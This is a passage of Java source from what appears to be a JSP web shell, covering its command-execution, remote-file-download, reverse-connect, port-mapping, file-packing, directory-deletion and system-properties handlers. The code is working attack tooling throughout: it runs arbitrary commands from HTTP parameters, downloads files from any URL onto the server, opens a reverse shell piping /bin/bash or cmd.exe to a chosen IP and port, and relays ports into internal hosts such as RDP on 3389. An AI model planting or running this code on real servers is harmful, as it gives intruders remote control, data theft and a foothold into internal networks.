cal.set(Calendar.HOUR,Integer.parseInt(hour));
cal.set(Calendar.MINUTE,Integer.parseInt(minute));
cal.set(Calendar.SECOND,Integer.parseInt(second));
if(file.setLastModified(cal.getTimeInMillis())){
JSession.setAttribute(MSG,"Reset File Property Success!");
} else {
JSession.setAttribute(MSG,"<span style='color:red'>Reset File Property Failed!</span>");
}
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
//VShell
private static class VsInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String cmd = request.getParameter("command");
String program = request.getParameter("program");
if (cmd == null) {
if (ISLINUX)
cmd = "id";
else
cmd = "cmd.exe /c set";
}
if (program == null) 
program = "cmd.exe /c net start > "+SHELL_DIR+"/Log.txt";
if (JSession.getAttribute(MSG)!=null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
JSession.removeAttribute(MSG);
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Execute Program &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"shell\"/>"+
"<input type=\"hidden\" name=\"type\" value=\"program\"/>"+
"Parameter<br /><input class=\"input\" name=\"program\" id=\"program\" value=\""+program+"\" type=\"text\" size=\"100\" />"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"/>"+
"</p>"+
"</form>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Execute Shell &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"shell\"/>"+
"<input type=\"hidden\" name=\"type\" value=\"command\"/>"+
"Parameter<br /><input class=\"input\" name=\"command\" id=\"command\" value=\""+cmd+"\" type=\"text\" size=\"100\"/>"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"/>"+
"</p>"+
"</form>"+
"</td>"+
"</tr></table>");
} catch (Exception e) {

throw e ;
}
}
}
private static class ShellInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String type = request.getParameter("type");
if (type.equals("command")) {
((Invoker)ins.get("vs")).invoke(request,response,JSession);
out.println("<div style='margin:10px'><hr/>");
out.println("<pre>");
String command = request.getParameter("command");
if (!Util.isEmpty(command)) {
Process pro = Runtime.getRuntime().exec(command);
BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));
String s = reader.readLine();
while (s != null) {
out.println(Util.htmlEncode(Util.getStr(s)));
s = reader.readLine();
}
reader.close();
reader = new BufferedReader(new InputStreamReader(pro.getErrorStream()));
s = reader.readLine();
while (s != null) {
out.println(Util.htmlEncode(Util.getStr(s)));
s = reader.readLine();
}
reader.close();
out.println("</pre></div>");
}
} else {
String program = request.getParameter("program");
if (!Util.isEmpty(program)) {
Process pro = Runtime.getRuntime().exec(program);
JSession.setAttribute(MSG,"Program Has Run Success!");
((Invoker)ins.get("vs")).invoke(request,response,JSession);
}
}
} catch (Exception e) {

throw e ;
}
}
}
private static class DownInvoker extends DefaultInvoker{
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String path  = request.getParameter("path");
if (Util.isEmpty(path)) 
return;
InputStream i = null;
Object enter = JSession.getAttribute(ENTER);
String fileName = null;
if (enter == null) {
File f = new File(path);
if (!f.exists()) 
return;
fileName = f.getName();
i = new FileInputStream(f);
} else {
ZipFile zf = new ZipFile((String)enter);
ZipEntry entry = new ZipEntry(path);
fileName = entry.getName().substring(entry.getName().lastIndexOf("/") + 1);
i = zf.getInputStream(entry);
}
response.setHeader("Content-Disposition","attachment;filename="+URLEncoder.encode(fileName,PAGE_CHARSET));
BufferedInputStream input = new BufferedInputStream(i);
BufferedOutputStream output = new BufferedOutputStream(response.getOutputStream());
byte[] data = new byte[1024];
int len = input.read(data);
while (len != -1) {
output.write(data,0,len);
len = input.read(data);
}
input.close();
output.close();
} catch (Exception e) {

throw e ;
}
}
}
//VDown
private static class VdInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String savepath = request.getParameter("savepath");
String url = request.getParameter("url");
if (Util.isEmpty(url))
url = "http://www.baidu.com/";
if (Util.isEmpty(savepath)) {
savepath = JSession.getAttribute(CURRENT_DIR).toString();
}
if (!Util.isEmpty(JSession.getAttribute("done"))) {
Util.outMsg(out,"Download Remote File Success!");
JSession.removeAttribute("done");
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Remote File DownLoad &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"downRemote\"/>"+
"<p>File&nbsp;&nbsp;&nbsp;URL: "+
"  <input class=\"input\" name=\"url\" value=\""+url+"\" id=\"url\" type=\"text\" size=\"200\"/></p>"+
"<p>Save Path: "+
"<input class=\"input\" name=\"savepath\" id=\"savepath\" value=\""+savepath+"\" type=\"text\" size=\"200\"/></p>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"DownLoad\" type=\"submit\" size=\"100\"/>"+
"</p>"+
"</form></table>");
} catch (Exception e) {

throw e ;
}
}
}
private static class DownRemoteInvoker extends DefaultInvoker {
public boolean doBefore(){return true;}
public boolean doAfter(){return true;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String downFileUrl = request.getParameter("url");
String savePath = request.getParameter("savepath");
if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))
return;
URL downUrl = new URL(downFileUrl);
URLConnection conn = downUrl.openConnection();

File tempF = new File(savePath);
File saveF = tempF;
if (tempF.isDirectory()) {
String fName = downFileUrl.substring(downFileUrl.lastIndexOf("/")+1);
saveF = new File(tempF,fName);
}
BufferedInputStream in = new BufferedInputStream(conn.getInputStream());
BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(saveF));
byte[] data = new byte[1024];
int len = in.read(data);
while (len != -1) {
out.write(data,0,len);
len = in.read(data);
}
in.close();
out.close();
JSession.setAttribute("done","d");
((Invoker)ins.get("vd")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}
private static class IndexInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
((Invoker)ins.get("filelist")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}
private static class MkDirInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String name = request.getParameter("name");
File f = new File(name);
if (!f.isAbsolute()) {
String path = JSession.getAttribute(CURRENT_DIR).toString();
if (!path.endsWith("/"))
path += "/";
path += name;
f = new File(path);
}
f.mkdirs();
JSession.setAttribute(MSG,"Make Directory Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
private static class MoveInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String src = request.getParameter("src");
String target  = request.getParameter("to");
if (!Util.isEmpty(target) && !Util.isEmpty(src)) {
File file = new File(src);
if(file.renameTo(new File(target))) {
JSession.setAttribute(MSG,"Move File Success!");
} else {
String msg = "Move File Failed!";
if (file.isDirectory()) {
msg += "The Move Will Failed When The Directory Is Not Empty.";
}
JSession.setAttribute(MSG,msg);
}
response.sendRedirect(SHELL_NAME);
}
} catch (Exception e) {

throw e ;
}
}
}
private static class RemoveDirInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String dir = request.getParameter("dir");
File file = new File(dir);
if (file.exists()) {
deleteFile(file);
deleteDir(file);
}

JSession.setAttribute(MSG,"Remove Directory Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
public void deleteFile(File f) {
if (f.isFile()) {
f.delete();
}else {
File[] list = f.listFiles();
for (int i = 0;i<list.length;i++) {
						File ff=list[i];
deleteFile(ff);
}
}
}
public void deleteDir(File f) {
File[] list = f.listFiles();
if (list.length == 0) {
f.delete();
} else {
for (int i = 0;i<list.length;i++) {
						File ff=list[i];
deleteDir(ff);
}
deleteDir(f);
}
}
}
private static class PackBatchInvoker extends DefaultInvoker{
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String files = request.getParameter("files");
if (Util.isEmpty(files))
return;
String saveFileName = request.getParameter("savefilename");
File saveF = new File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" Has Been Exists!");
response.sendRedirect(SHELL_NAME);
return;
}
ZipOutputStream zout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(saveF)));
String[] arr = files.split(",");
for (int i = 0;i<arr.length;i++) {
						String f=arr[i];
File pF = new File(JSession.getAttribute(CURRENT_DIR).toString(),f);
ZipEntry entry = new ZipEntry(pF.getName());
zout.putNextEntry(entry);
FileInputStream fInput = new FileInputStream(pF);
int len = 0;
byte[] buf = new byte[1024];
while ((len = fInput.read(buf)) != -1) {
zout.write(buf, 0, len);
zout.flush();
}
fInput.close();
}
zout.close();
JSession.setAttribute(MSG,"Pack Files Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e;
}
}
}
private static class VPackConfigInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String packfile = request.getParameter("packedfile");
String currentd = JSession.getAttribute(CURRENT_DIR).toString();
out.println("<form action='"+SHELL_NAME+"' method='post'>"+
"<input type='hidden' name='o' value='pack'/>"+
"<input type='hidden' name='config' value='true'/>"+
"<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"    <tr>"+
"      <td><h2 id=\"Bin_H2_Title\">Pack Configuration &gt;&gt;<hr/></h2>"+
"        <div id=\"hOWTm\">"+
"          <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"            <tr align=\"center\">"+
"              <td style=\"width:5%\"></td>"+
"              <td  align=\"center\"><table border=\"0\">"+
"                <tr>"+
"                  <td>Packed Dir</td>"+
"                  <td><input type=\"text\" name=\"packedfile\" size='100' value=\""+packfile+"\" class=\"input\"/></td>"+
"                </tr>"+
"                <tr>"+
"                  <td>Save To</td>"+
"                  <td><input type=\"text\" name=\"savefilename\" size='100' value=\""+((currentd.endsWith("/") ? currentd : currentd+"/")+"pack.zip")+"\" class=\"input\"/></td>"+
"                </tr>"+
"                <tr>"+
"                  <td colspan=\"2\"><fieldset><legend>Ext Filter</legend>"+
"					<input type='radio' name='extfilter' value='no'/>no <input checked type='radio' name='extfilter' value='blacklist'/>Blacklist <input type='radio' name='extfilter' value='whitelist'/>Whitelist"+
"					<hr/><input type='text' class='input' size='100' value='mp3,wmv,rm,rmvb,avi' name='fileext'/>"+
"					</fieldset></td>"+
"                  </tr>"+
"                <tr>"+
"                  <td>Filesize Filter</td>"+
"                  <td><input type=\"text\" name=\"filesize\" value=\"0\" class=\"input\"/>(KB) "+
"					<input type='radio' name='sizefilter' value='no' checked/>no <input type='radio' name='sizefilter' value='greaterthan'/>greaterthan<input type='radio' name='sizefilter' value='lessthan'/>lessthan</td>"+
"                </tr>"+
"                <tr>"+
"                  <td>Exclude Dir</td>"+
"                  <td><input type=\"text\" name=\"exclude\" size='100' class=\"input\"/></td>"+
"                </tr>"+
"              </table></td>"+
"            </tr>"+
"            <tr align=\"center\">"+
"              <td colspan=\"2\">"+
"                <input type=\"submit\" name=\"FJE\" value=\"Pack\" id=\"FJE\" class=\"bt\"/>"+
"              </td>"+
"            </tr>"+
"          </table>"+
"        </div></td>"+
"    </tr>"+
"  </table></form>"
);
} catch (Exception e) {

throw e;
}
}
}
private static class PackInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
private boolean config = false;
private String extFilter = "blacklist";
private String[] fileExts = null;
private String sizeFilter = "no";
private int filesize = 0;
private String[] exclude = null;
private String packFile = null;
private void reset(){
this.config = false;
this.extFilter = "blacklist";
this.fileExts = null;
this.sizeFilter = "no";
this.filesize = 0;
this.exclude = null;
this.packFile = null;
}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String config = request.getParameter("config");
if (!Util.isEmpty(config) && config.equals("true")) {
this.config = true;
this.extFilter = request.getParameter("extfilter");
this.fileExts = request.getParameter("fileext").split(",");
this.sizeFilter = request.getParameter("sizefilter");
this.filesize = Integer.parseInt(request.getParameter("filesize"));
this.exclude = request.getParameter("exclude").split(",");
}
String packedFile = request.getParameter("packedfile");
if (Util.isEmpty(packedFile))
return;
this.packFile = packedFile;
String saveFileName = request.getParameter("savefilename");
File saveF = null;
if (this.config)
saveF = new File(saveFileName);
else
saveF = new File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" Has Been Exists!");
response.sendRedirect(SHELL_NAME);
return;
}
File pF = new File(packedFile);
ZipOutputStream zout = null;
String base = "";
if (pF.isDirectory()) {
if (pF.listFiles().length == 0) {
JSession.setAttribute(MSG,"No File To Pack ! Maybe The Directory Is Empty .");
response.sendRedirect(SHELL_NAME);
this.reset();
return;
}
zout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(saveF)));
zipDir(pF,base,zout);
} else {
zout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(saveF)));
zipFile(pF,base,zout);
}
zout.close();
this.reset();
JSession.setAttribute(MSG,"Pack File Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {
throw e;
}
}
public void zipDir(File f,String base,ZipOutputStream zout)  throws Exception {
if (f.isDirectory()) {
if (this.config) {
String curName = f.getAbsolutePath().replace('\\','/');
curName = curName.replaceAll("\\Q"+this.packFile+"\\E","");
if (this.exclude != null) {
for (int i = 0;i<exclude.length;i++) {
if (!Util.isEmpty(exclude[i]) && curName.startsWith(exclude[i])) {
return;
}
}
}
}
File[] arr = f.listFiles();
for (int i = 0;i<arr.length;i++) {
							File ff=arr[i];
String tmpBase = base;
if (!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
tmpBase += "/";
zipDir(ff,tmpBase+f.getName(),zout);
}
} else {
String tmpBase = base;
if (!Util.isEmpty(tmpBase) &&!tmpBase.endsWith("/"))
tmpBase += "/";
zipFile(f,tmpBase,zout);
}

}
public void zipFile(File f,String base,ZipOutputStream zout) throws Exception{
if (this.config) {
String ext = f.getName().substring(f.getName().lastIndexOf('.')+1);
if (this.extFilter.equals("blacklist")) {
if (Util.exists(this.fileExts,ext)) {
return;
}
} else if (this.extFilter.equals("whitelist")) {
if (!Util.exists(this.fileExts,ext)) {
return;
}
}
if (!this.sizeFilter.equals("no")) {
double size = f.length() / 1024;
if (this.sizeFilter.equals("greaterthan")) {
if (size < filesize)
return;
} else if (this.sizeFilter.equals("lessthan")) {
if (size > filesize)
return;
}
}
}
ZipEntry entry = new ZipEntry(base+f.getName());
zout.putNextEntry(entry);
FileInputStream fInput = new FileInputStream(f);
int len = 0;
byte[] buf = new byte[1024];
while ((len = fInput.read(buf)) != -1) {
zout.write(buf, 0, len);
zout.flush();
}
fInput.close();
}
}
private static class UnPackInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String savepath = request.getParameter("savepath");
String zipfile = request.getParameter("zipfile");
if (Util.isEmpty(savepath) || Util.isEmpty(zipfile))
return;
File save = new File(savepath);
save.mkdirs();
ZipFile file = new ZipFile(new File(zipfile));   
Enumeration e = file.entries();   
while (e.hasMoreElements()) {   
ZipEntry en = (ZipEntry) e.nextElement(); 
String entryPath = en.getName();
int index = entryPath.lastIndexOf("/");
if (index != -1)
entryPath = entryPath.substring(0,index);
File absEntryFile = new File(save,entryPath);
if (!absEntryFile.exists() && (en.isDirectory() || en.getName().indexOf("/") != -1)) 
absEntryFile.mkdirs();
BufferedOutputStream output = null;
BufferedInputStream input = null;
try {
output = new BufferedOutputStream(   
new FileOutputStream(new File(save,en.getName())));   
input = new BufferedInputStream(   
file.getInputStream(en));   
byte[] b = new byte[1024];   
int len = input.read(b);   
while (len != -1) {   
output.write(b, 0, len);   
len = input.read(b);   
}   
} catch (Exception ex) {
} finally {
try {
if (output != null)
output.close();
if (input != null)
input.close();
} catch (Exception ex1) {
}
}
}
file.close();
JSession.setAttribute(MSG,"UnPack File Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
//VMapPort
private static class VmpInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object localIP = JSession.getAttribute("localIP");
Object localPort = JSession.getAttribute("localPort");
Object remoteIP = JSession.getAttribute("remoteIP");
Object remotePort = JSession.getAttribute("remotePort");
Object done = JSession.getAttribute("done");

JSession.removeAttribute("localIP");
JSession.removeAttribute("localPort");
JSession.removeAttribute("remoteIP");
JSession.removeAttribute("remotePort");
JSession.removeAttribute("done");

if (Util.isEmpty(localIP))
localIP = InetAddress.getLocalHost().getHostAddress();
if (Util.isEmpty(localPort))
localPort = "3389";
if (Util.isEmpty(remoteIP))
remoteIP = "www.baidu.com";
if (Util.isEmpty(remotePort))
remotePort = "80";
if (!Util.isEmpty(done))
Util.outMsg(out,done.toString());

out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<input type=\"hidden\" name=\"o\" value=\"mapPort\"/>"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">PortMap &gt;&gt;<hr/></h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td style=\"width:20%\" align=\"left\"><br/>Local Ip :"+
"          <input name=\"localIP\" id=\"localIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+localIP+"\"/>"+
"          </td>"+
"        <td style=\"width:20%\" align=\"left\">Local Port :"+
"          <input name=\"localPort\" id=\"localPort\" type=\"text\" class=\"input\" size=\"20\" value=\""+localPort+"\"/></td>"+
"        <td style=\"width:20%\" align=\"left\">Remote Ip :"+
"          <input name=\"remoteIP\" id=\"remoteIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+remoteIP+"\"/></td>"+
"        <td style=\"width:20%\" align=\"left\">Remote Port :"+
"          <input name=\"remotePort\" id=\"remotePort\" type=\"text\" class=\"input\" size=\"20\" value=\""+remotePort+"\"/></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"5\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"MapPort\" id=\"FJE\" class=\"bt\"/>"+
"			<input type=\"button\" name=\"giX\" value=\"ClearAll\" id=\"giX\" onClick=\"location.href='"+SHELL_NAME+"?o=smp'\" class=\"bt\"/>"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
"</td>"+
"</tr>"+
"</table>"+
"</form>");
String targetIP = request.getParameter("targetIP");
String targetPort = request.getParameter("targetPort");
String yourIP = request.getParameter("yourIP");
String yourPort = request.getParameter("yourPort");
if (Util.isEmpty(targetIP))
targetIP = "127.0.0.1";
if (Util.isEmpty(targetPort))
targetPort = "3389";
if (Util.isEmpty(yourIP))
yourIP = request.getRemoteAddr();
if (Util.isEmpty(yourPort))
yourPort = "53";
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<input type=\"hidden\" name=\"o\" value=\"portBack\"/>"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">Port Back &gt;&gt;<hr/></h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td style=\"width:20%\" align=\"left\"><br/>Target Ip :"+
"          <input name=\"targetIP\" id=\"targetIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+targetIP+"\"/>"+
"          </td>"+
"        <td style=\"width:20%\" align=\"left\">Target Port :"+
"          <input name=\"targetPort\" id=\"targetPort\" type=\"text\" class=\"input\" size=\"20\" value=\""+targetPort+"\"/></td>"+
"        <td style=\"width:20%\" align=\"left\">Your Ip :"+
"          <input name=\"yourIP\" id=\"yourIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+yourIP+"\"/></td>"+
"        <td style=\"width:20%\" align=\"left\">Your Port :"+
"          <input name=\"yourPort\" id=\"yourPort\" type=\"text\" class=\"input\" size=\"20\" value=\""+yourPort+"\"/></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"5\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"Port Back\" id=\"FJE\" class=\"bt\"/>"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
"</td>"+
"</tr>"+
"</table>"+
"</form>");
} catch (Exception e) {

throw e ;
}
}
}
//StopMapPort
private static class SmpInvoker extends DefaultInvoker {
public boolean doAfter(){return true;}
public boolean doBefore(){return true;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket server = (ServerSocket)JSession.getAttribute(PORT_MAP);
server.close();
}
JSession.setAttribute("done","Stop Success!");
((Invoker)ins.get("vmp")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}
//PortBack
private static class PortBackInvoker extends DefaultInvoker {
public boolean doAfter(){return true;}
public boolean doBefore(){return true;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String targetIP = request.getParameter("targetIP");
String targetPort = request.getParameter("targetPort");
String yourIP = request.getParameter("yourIP");
String yourPort = request.getParameter("yourPort");
Socket yourS = new Socket();
yourS.connect(new InetSocketAddress(yourIP,Integer.parseInt(yourPort)));
Socket targetS = new Socket();
targetS.connect(new InetSocketAddress(targetIP,Integer.parseInt(targetPort)));
StreamConnector.readFromLocal(new DataInputStream(targetS.getInputStream()),new DataOutputStream(yourS.getOutputStream()));
StreamConnector.readFromRemote(targetS,yourS,new DataInputStream(yourS.getInputStream()),new DataOutputStream(targetS.getOutputStream()));
JSession.setAttribute("done","Port Back Success !");
((Invoker)ins.get("vmp")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}
private static class MapPortInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String localIP = request.getParameter("localIP");
String localPort = request.getParameter("localPort");
final String remoteIP = request.getParameter("remoteIP");
final String remotePort = request.getParameter("remotePort");
if (Util.isEmpty(localIP) || Util.isEmpty(localPort) || Util.isEmpty(remoteIP) || Util.isEmpty(remotePort))
return;
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket s = (ServerSocket)obj;
s.close();
}
final ServerSocket server = new ServerSocket();
server.bind(new InetSocketAddress(localIP,Integer.parseInt(localPort)));
JSession.setAttribute(PORT_MAP,server);
new Thread(new Runnable(){
public void run(){
while (true) {
Socket soc = null;
Socket remoteSoc = null;
DataInputStream remoteIn = null;
DataOutputStream remoteOut = null;
DataInputStream localIn = null;
DataOutputStream localOut = null;
try{
soc = server.accept();
remoteSoc = new Socket();
remoteSoc.connect(new InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));
remoteIn = new DataInputStream(remoteSoc.getInputStream());
remoteOut = new DataOutputStream(remoteSoc.getOutputStream());
localIn = new DataInputStream(soc.getInputStream());
localOut = new DataOutputStream(soc.getOutputStream());
StreamConnector.readFromLocal(localIn,remoteOut);
StreamConnector.readFromRemote(soc,remoteSoc,remoteIn,localOut);
}catch(Exception ex)
{								
break;
}
}
}

}).start();
JSession.setAttribute("done","Map Port Success!");
JSession.setAttribute("localIP",localIP);
JSession.setAttribute("localPort",localPort);
JSession.setAttribute("remoteIP",remoteIP);
JSession.setAttribute("remotePort",remotePort);
JSession.setAttribute(SESSION_O,"vmp");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
//VBackConnect
private static class VbcInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object ip = JSession.getAttribute("ip");
Object port = JSession.getAttribute("port");
Object program = JSession.getAttribute("program");
Object done = JSession.getAttribute("done");
JSession.removeAttribute("ip");
JSession.removeAttribute("port");
JSession.removeAttribute("program");
JSession.removeAttribute("done");
if (Util.isEmpty(ip))
ip = request.getRemoteAddr();
if (Util.isEmpty(port) || !Util.isInteger(port.toString()))
port = "53";
if (Util.isEmpty(program)) {
if (ISLINUX)
program = "/bin/bash";
else
program = "cmd.exe";
}

if (!Util.isEmpty(done))
Util.outMsg(out,done.toString());
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<input type=\"hidden\" name=\"o\" value=\"backConnect\"/>"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">Back Connect &gt;&gt;</h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td  align=\"center\">Your Ip :"+
"          <input name=\"ip\" id=\"ip\" type=\"text\" class=\"input\" size=\"20\" value=\""+ip+"\"/>"+
"          Your Port :"+
"          <input name=\"port\" id=\"port\" type=\"text\" class=\"input\" size=\"20\" value=\""+port+"\"/>Program To Back :"+
"          <input name=\"program\" id=\"program\" type=\"text\" value=\""+program+"\" class=\"input\" size=\"20\" value=\"d\" /></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"2\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"Connect\" id=\"FJE\" class=\"bt\" />"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
"</td>"+
"</tr>"+
"</table>"+
"</form>");
} catch (Exception e) {

throw e ;
}
}
}
private static class BackConnectInvoker extends DefaultInvoker {
public boolean doAfter(){return false;}
public boolean doBefore(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String ip = request.getParameter("ip");
String port = request.getParameter("port");
String program = request.getParameter("program");
if (Util.isEmpty(ip) || Util.isEmpty(program) || !Util.isInteger(port))
return;
Socket socket = new Socket(ip,Integer.parseInt(port));
Process process = Runtime.getRuntime().exec(program);
(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();
(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
JSession.setAttribute("done","Back Connect Success!");
JSession.setAttribute("ip",ip);
JSession.setAttribute("port",port);
JSession.setAttribute("program",program);
JSession.setAttribute(SESSION_O,"vbc");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
private static class JspEnvInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"      <tr>"+
"        <td><h2 id=\"Ninty_H2_Title\">System Properties &gt;&gt;</h2>"+
"          <div id=\"ghaB\">"+
"            <hr/>"+
"            <ul id=\"Ninty_Ul_Sys\" class=\"info\">");
Properties pro = System.getProperties();
Enumeration names = pro.propertyNames();
while (names.hasMoreElements()){
String name = (String)names.nextElement();
out.println("<li><u>"+Util.htmlEncode(name)+" : </u>"+Util.htmlEncode(pro.getProperty(name))+"</li>");
}
out.println("</ul><h2 id=\"Ninty_H2_Mac\">System Environment &gt;&gt;</h2><hr/><ul id=\"Ninty_Ul_Sys\" class=\"info\">");
/*
					Map envs = System.getenv();
Set<Map.Entry<String,String>> entrySet = envs.entrySet();
for (Map.Entry<String,String> en:entrySet) {
out.println("<li><u>"+Util.htmlEncode(en.getKey())+" : </u>"+Util.htmlEncode(en.getValue())+"</li>");
}*/
out.println("</ul></div></td>"+
"      </tr>"+
"    </table>");
} catch (Exception e) {

throw e ;
}
}
}
